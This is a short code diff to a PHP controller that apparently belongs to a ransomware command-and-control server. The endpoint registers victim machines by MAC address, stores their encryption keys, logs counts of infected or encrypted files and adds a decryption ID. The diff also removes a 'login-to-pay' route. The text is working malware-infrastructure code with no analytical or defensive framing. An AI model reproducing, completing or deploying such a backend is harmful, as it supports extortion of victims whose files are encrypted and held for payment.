@@ -28,7 +28,7 @@ class UserController extends BaseController
     {
         try {
             $data = json_decode($request->getContent(), true);
-            $macAdress = $data['macAdress'];
+            $macAdress = $data['macAddress'];
 
             $encryptionKey = $data['encryptionKey'];
 
@@ -43,31 +43,19 @@ class UserController extends BaseController
                     $uuid
                 ))
                 ->setEncryptionKey($encryptionKey)
-                ->setRoles(['ROLE_USER']);
+                ->setRoles(['ROLE_USER'])
+                ->setDecryptId($uuid);
 
             $this->userRepository->save($user, true);
 
             $log = (new Log)
                 ->setIp($macAdress);
 
-            if(array_key_exists('infectedFiles', $data)) $log->setNumberInfectedFile($data['infectedFiles']);
+            if(array_key_exists('encryptedFiles', $data)) $log->setNumberInfectedFile($data['encryptedFiles']);
 
             $this->logRepository->save($log, true);
 
             return $this->json($uuid);
-        } catch(\Throwable $e) {
-            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
-        }
-    }
-
-    /**
-     * @Route('/login-to-pay')
-     */
-    public function loginToPay(Request $request): Response
-    {
-        try {
-            $data = json_decode($request->getContent(), true);
-            return $this->json();
         } catch(\Throwable $e) {
             return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
         }
